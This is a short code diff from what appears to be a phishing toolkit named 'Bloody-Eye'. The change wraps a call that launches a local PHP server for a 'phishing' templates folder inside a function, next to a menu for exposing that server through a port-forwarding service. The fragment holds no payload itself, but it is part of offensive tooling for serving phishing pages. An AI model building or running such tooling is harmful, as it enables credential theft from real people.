@@ -543,8 +543,9 @@ exit();""")
     print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+" Localhost")
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+" Ngorok.io")
     print("")
-    with open("log","w") as phplog:
-       Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)  
+    def phpserver():
+       with open("log","w") as phplog:
+          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)  
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       print("")
